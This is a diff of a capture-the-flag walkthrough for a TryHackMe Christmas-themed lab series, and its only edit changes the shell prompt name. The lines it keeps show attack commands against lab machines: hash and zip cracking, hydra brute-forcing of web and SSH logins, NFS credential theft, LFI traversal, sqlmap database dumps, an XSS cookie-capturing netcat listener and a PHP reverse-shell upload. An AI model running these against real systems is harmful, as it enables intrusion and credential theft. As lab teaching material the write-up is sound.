@@ -13,7 +13,7 @@ McElferson calls you to take a look at the website to see if there’s anything 
 ## 2. If you decode the cookie, what is the value of the fixed part of the cookie?
 the cookie is encoded with base64,to decode it run:
 ```console
-kali@kali:~$ echo "aDRja3Y0ZXI5bGwxIXNz" | base64 -d
+bibo318@parrot:~$ echo "aDRja3Y0ZXI5bGwxIXNz" | base64 -d
 h4ckv4er9ll1!ss
 ```
 flag: ```v4er9ll1!ss```
@@ -21,7 +21,7 @@ flag: ```v4er9ll1!ss```
 we know that the username that we try to gain access = mcinventory so we need to add the prefix part -> ```mcinventoryv4er9ll1!ss```
 the cookie is encoded with base64, to encode it run:
 ```console
-kali@kali:~$ echo "mcinventoryv4er9ll1!ss" |base64 
+bibo318@parrot:~$ echo "mcinventoryv4er9ll1!ss" |base64 
 bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==
 ```
 now we need to change = to %3D which give us -> ```bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D```
@@ -93,11 +93,11 @@ at the begining I wanted to use john to crack the password but it seeam like joh
 
 So after a bit of reasearching. HashCat seem like is the best option for this task [link](https://hkh4cks.com/blog/2018/02/05/password-cracking-tools/#hashcat). LETs do it
 ```console
-kali@kali:~$ nano hash.lst # add the buddy hashed password
-kali@kali:~$ cat hash.lst 
+bibo318@parrot:~$ nano hash.lst # add the buddy hashed password
+bibo318@parrot:~$ cat hash.lst 
 buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
-kali@kali:~$ hashcat -m 1800 -a 0 -o buddy.txt hash.lst /usr/share/wordlists/rockyou.txt --force
-kali@kali:~$ cat buddy.txt 
+bibo318@parrot:~$ hashcat -m 1800 -a 0 -o buddy.txt hash.lst /usr/share/wordlists/rockyou.txt --force
+bibo318@parrot:~$ cat buddy.txt 
 $6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:XXXXXXX
 ```
 find out what ```XXXXXXX``` is. GL
@@ -140,7 +140,7 @@ Elf Lola is an elf-of-interest. Has she been helping the Christmas Monster? lets
 ## What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
 A tool call ```exiftool``` can be used to examining img meta data. to install it run ```sudo apt install libimage-exiftool-perl```
 ```console
-kali@kali:~$ exiftool Desktop/thegrinch.jpg 
+bibo318@parrot:~$ exiftool Desktop/thegrinch.jpg 
 ExifTool Version Number         : 11.94
 File Name                       : thegrinch.jpg
 Directory                       : Desktop
@@ -201,34 +201,34 @@ LEARN [here](https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGC
 ## What data was exfiltrated via DNS? 
 open the .pcap with wireshark. search for ```UDP``` packet. you will find some udp packet that has some weird HEXdump. Right click on it and select **follow udp flow**. Copy the hexdump and use ```xxd``` get the plain text.
 ```console
-kali@kali:~$ echo "43616e64792043616e652053657269616c204e756d6265722038343931" | xxd -r -p
+bibo318@parrot:~$ echo "43616e64792043616e652053657269616c204e756d6265722038343931" | xxd -r -p
 ```
 ## What did Little Timmy want to be for Christmas?
 We learn that you can export http ocject from wirshark. do that! you will. to solve this task, we unzip ```christmaslists.zip```. The file is encrypted. To crack the .zip, we need a tool call 
 ```console
-kali@kali:~$ sudo apt-get install fcrackzip
-kali@kali:~$ fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v Downloads/Day6/christmaslists.zip
+bibo318@parrot:~$ sudo apt-get install fcrackzip
+bibo318@parrot:~$ fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v Downloads/Day6/christmaslists.zip
 ```
 -b specifies brute forcing, --method 2 specifies a Zip file, -D specifies a Dictionary and -V verifies the password is indeed correct
 
 
 After you get the password
 ```console
-kali@kali:~$ cd Downloads/Day6/
-kali@kali:~/Downloads/Day6$ sudo unzip -P december christmaslists.zip 
+bibo318@parrot:~$ cd Downloads/Day6/
+bibo318@parrot:~/Downloads/Day6$ sudo unzip -P december christmaslists.zip 
 Archive:  christmaslists.zip
  extracting: christmaslistdan.tx    
   inflating: christmaslistdark.txt   
   inflating: christmaslistskidyandashu.txt  
   inflating: christmaslisttimmy.txt
-kali@kali:~/Downloads/Day6$ cat christmaslisttimmy.txt 
+bibo318@parrot:~/Downloads/Day6$ cat christmaslisttimmy.txt 
 ```
 ## What was hidden within the file?
 ```console
-kali@kali:~$ steghide extract -sf Downloads/Day6/TryHackMe.jpg 
+bibo318@parrot:~$ steghide extract -sf Downloads/Day6/TryHackMe.jpg 
 Enter passphrase: 
 steghide: did not write to file "christmasmonster.txt".
-kali@kali:~$ cat christmasmonster.txt
+bibo318@parrot:~$ cat christmasmonster.txt
 ```
 some cool stuff I learn on the side, check out [here](https://en.wikipedia.org/wiki/April_Fools%27_Day_Request_for_Comments) and [here](https://tools.ietf.org/html/rfc527)
 
@@ -355,7 +355,7 @@ msf5 post(multi/gather/tomcat_gather) > db_nmap -p 80 -A 10.10.87.246
 ```
 nikto use for scan web app vuln
 ```console
-kali@kali:~$ nikto -host 10.10.87.246
+bibo318@parrot:~$ nikto -host 10.10.87.246
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.87.246
@@ -442,10 +442,10 @@ Deploy the machine and starting scanning the IP. The machine may take a few minu
 READ [this](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#)
 ## What is the password inside the creds.txt file?
 ```console
-kali@kali:~$ mkdir Day10NFS
-kali@kali:~$ sudo mount -t nfs 10.10.86.177:/ Day10NFS/
-kali@kali:~$ cd Day10NFS/opt/files/
-kali@kali:~/Day10NFS/opt/files$ cat creds.txt
+bibo318@parrot:~$ mkdir Day10NFS
+bibo318@parrot:~$ sudo mount -t nfs 10.10.86.177:/ Day10NFS/
+bibo318@parrot:~$ cd Day10NFS/opt/files/
+bibo318@parrot:~/Day10NFS/opt/files$ cat creds.txt
 ```
 ## What is the name of the file running on port 21?
 btw you need to be a root to get the file otherwirse it you will keep geting permission deniend 
@@ -504,7 +504,7 @@ This challenge accumulates all the things you've learnt from the previous challe
 4. enumerate the host machine to elevate privileges
 
 ```console
-kali@kali:~$ nmap -Pn -A 10.10.182.103
+bibo318@parrot:~$ nmap -Pn -A 10.10.182.103
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:22 EDT
 Nmap scan report for 10.10.182.103
 Host is up (0.048s latency).
@@ -535,7 +535,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
 ```
 ## A web server is running on the target. What is the hidden directory which the website lives on?
 ```
-kali@kali:~$ nmap -Pn 10.10.182.103 # -pn treat the target like it is up, seem like it block icmp
+bibo318@parrot:~$ nmap -Pn 10.10.182.103 # -pn treat the target like it is up, seem like it block icmp
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:19 EDT
 Nmap scan report for 10.10.182.103
 Host is up (0.051s latency).
@@ -543,7 +543,7 @@ Not shown: 998 filtered ports
 PORT     STATE SERVICE
 80/tcp   open  http
 3389/tcp open  ms-wbt-server
-kali@kali:~$dirbuster& #use wordlist dirbuster2.3 medium
+bibo318@parrot:~$dirbuster& #use wordlist dirbuster2.3 medium
 ```
 you will find you answer by runing the dirbuster.
 ## Gain initial access and read the contents of user.txt
@@ -580,7 +580,7 @@ Elf Charlie likes to make notes and store them on his server. Are you able to ta
 READ [this](https://blog.tryhackme.com/lfi/)
 
 ```console
-kali@kali:~$ sudo nmap -A 10.10.21.94
+bibo318@parrot:~$ sudo nmap -A 10.10.21.94
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 22:55 EDT
 Nmap scan report for 10.10.21.94
 Host is up (0.050s latency).
@@ -640,15 +640,15 @@ this give us ````10.10.21.94/get-file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..
 
 now use hashcat
 ```console
-kali@kali:~$ mkdir Day15 && cd Day15
-kali@kali:~/Day15$ nano charlie.lst # add the hash
-kali@kali:~/Day15$ hashcat -m 1800 -a 0 -o charlie.txt charlie.lst /usr/share/wordlists/rockyou.txt --force
-kali@kali:~/Day15$ cat charlie.txt
+bibo318@parrot:~$ mkdir Day15 && cd Day15
+bibo318@parrot:~/Day15$ nano charlie.lst # add the hash
+bibo318@parrot:~/Day15$ hashcat -m 1800 -a 0 -o charlie.txt charlie.lst /usr/share/wordlists/rockyou.txt --force
+bibo318@parrot:~/Day15$ cat charlie.txt
 ```
 ## What is flag1.txt?
 just SSH using charlie cerdential and grep the flag1.txt!!
 ```console
-kali@kali:~/Day15$ ssh charlie@10.10.21.94
+bibo318@parrot:~/Day15$ ssh charlie@10.10.21.94
 charlie@ip-10-10-21-94:~$ ls
 flag1.txt
 charlie@ip-10-10-21-94:~$ cat flag1.txt 
@@ -727,7 +727,7 @@ You suspect Elf Molly is communicating with the Christmas Monster. Compromise he
 READ [this](https://blog.tryhackme.com/hydra/)
 
 ```console
-kali@kali:~$ nmap -p- -A 10.10.14.193                                                              
+bibo318@parrot:~$ nmap -p- -A 10.10.14.193                                                              
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 22:11 EDT                                    
 Nmap scan report for 10.10.14.193                                                                  
 Host is up (0.059s latency).
@@ -746,12 +746,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
 ```console
-kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
+bibo318@parrot:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
 ```
 
 ## Use Hydra to bruteforce molly's SSH password. What is flag 2?
 ```console
-kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 -t 4 ssh
+bibo318@parrot:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 -t 4 ssh
 Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 22:18:51
@@ -760,7 +760,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 22:18:
 [22][ssh] host: 10.10.14.193   login: molly   password: butterfly
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-14 22:19:50
-kali@kali:~$ ssh molly@10.10.14.193
+bibo318@parrot:~$ ssh molly@10.10.14.193
 molly@ip-10-10-14-193:~$ ls
 flag2.txt
 molly@ip-10-10-14-193:~$ cat flag2.txt
@@ -789,7 +789,7 @@ Next craft the payload:
 ```
 Then make setup the server and try to refresh the forum and see if you will recieve your cookie
 ```console
-kali@kali:~$ nc -lvp 20000
+bibo318@parrot:~$ nc -lvp 20000
 listening on [any] 20000 ...
 10.8.14.151: inverse host lookup failed: Unknown host
 connect to [10.8.14.151] from (UNKNOWN) [10.8.14.151] 48702
@@ -804,7 +804,7 @@ Connection: keep-alive
 ```
 Yep it is working! so let run the server again and wait for admin to login!!
 ```console
-kali@kali:~$ nc -lvp 20000
+bibo318@parrot:~$ nc -lvp 20000
 listening on [any] 20000 ...
 10.10.165.251: inverse host lookup failed: Unknown host
 connect to [10.8.14.151] from (UNKNOWN) [10.10.165.251] 37236
@@ -860,8 +860,8 @@ Nmap done: 1 IP address (1 host up) scanned in 111.42 seconds
 ```
 ## Crack sam's password and read flag1.txt
 ```console
-kali@kali:~$ hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.50.118 -s 4567 -t 4 ssh # crack password with hydra
-kali@kali:~$ ssh sam@10.10.50.118 -p 4567 # ssh
+bibo318@parrot:~$ hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.50.118 -s 4567 -t 4 ssh # crack password with hydra
+bibo318@parrot:~$ ssh sam@10.10.50.118 -p 4567 # ssh
 sam@10.10.50.118's password: 
        .---.
       /     \
@@ -964,9 +964,9 @@ READ [this](https://docs.google.com/document/d/15XH_T1o6FLvnV19_JnXdlG2A8lj2Qtep
 ## Which field is SQL injectable? Use the input name used in the HTML code.
 we gonna use sqlmap with ```-r``` which is REQUESTFILE -> Load HTTP request from a file. To get the request, we run Burpsuite and intercept the post request when you tryo to login the web app. Copy the reqest and put it in a .txt:
 ```console
-kali@kali:~$ mkdir day23 && cd day23
-kali@kali:~/day23$ nano login.txt # put the content of the post request in this file
-kali@kali:~$ sqlmap -r day23/login.txt --dbs --batch # run sqlmap --dbs is Enumerate DBMS databases
+bibo318@parrot:~$ mkdir day23 && cd day23
+bibo318@parrot:~/day23$ nano login.txt # put the content of the post request in this file
+bibo318@parrot:~$ sqlmap -r day23/login.txt --dbs --batch # run sqlmap --dbs is Enumerate DBMS databases
 OST parameter 'XXXXXX' is a false positive
 POST parameter 'XXXXXXX' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 434 HTTP(s) requests:
@@ -1007,7 +1007,7 @@ before doing this task, I would like you to log in to the web app and try out. t
 
 from the last task, we know that there is 6 databases. the web app is like a social media app so I pick to try to find out what is in side ```social``` database
 ```console
-kali@kali:~$ sqlmap -r day23/login.txt -D social --tables --batch # --tables == get table -D is DBMS database to enumerate
+bibo318@parrot:~$ sqlmap -r day23/login.txt -D social --tables --batch # --tables == get table -D is DBMS database to enumerate
 Database: social
 [8 tables]
 +-----------------+
@@ -1023,7 +1023,7 @@ Database: social
 ```
 users table looks **juicy**, let get all columns
 ```console
-kali@kali:~/day23$ sqlmap -r login.txt -D social -T users --columms --batch
+bibo318@parrot:~/day23$ sqlmap -r login.txt -D social -T users --columms --batch
 [12 columns]
 +--------------+--------------+
 | Column       | Type         |
@@ -1049,8 +1049,8 @@ sqlmap -r login.txt -D social -T users -C username,password,email --batch --dump
 ## What is Santa Claus' plaintext password?
 Get the password and use some [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) to find out what hash algorithms is used. let go **hashcat**!!!
 ```console
-kali@kali:~/day23$ hashcat -m 0 -a 0 -o santacrack.txt "putthehashhere" /usr/share/wordlists/rockyou.txt --force
-kali@kali:~/day23$ cat santacrack.txt
+bibo318@parrot:~/day23$ hashcat -m 0 -a 0 -o santacrack.txt "putthehashhere" /usr/share/wordlists/rockyou.txt --force
+bibo318@parrot:~/day23$ cat santacrack.txt
 ```
 
 ## Santa has a secret! Which station is he meeting Mrs Mistletoe in?
@@ -1060,7 +1060,7 @@ I tried to upload the revers-shell.php in ```/usr/share/webshells/php``` none of
 
 save it and change ip to ur ip and port
 ```console
-kali@kali:~/day23$ nc -lnvp 20000 # run netcat using the port that you wrote in the script
+bibo318@parrot:~/day23$ nc -lnvp 20000 # run netcat using the port that you wrote in the script
 listening on [any] 20000 ...
 ```
 now upload our payload (reverse-shell scrip)
@@ -1136,8 +1136,8 @@ While this task does not have supporting material, here is a general approach on
 [LK stack](https://youtu.be/Hqn5p67uev4)
 let start with nmap
 ```console
-kali@kali:~/day24$ nmap -p- -A 10.10.41.211  > target.txt nmap and put it in .txt
-kali@kali:~/day24$ cat target.txt # show the result
+bibo318@parrot:~/day24$ nmap -p- -A 10.10.41.211  > target.txt nmap and put it in .txt
+bibo318@parrot:~/day24$ cat target.txt # show the result
 ```
 * 8000 = http server contain kibana-log.txt
 * 5061 = kibana
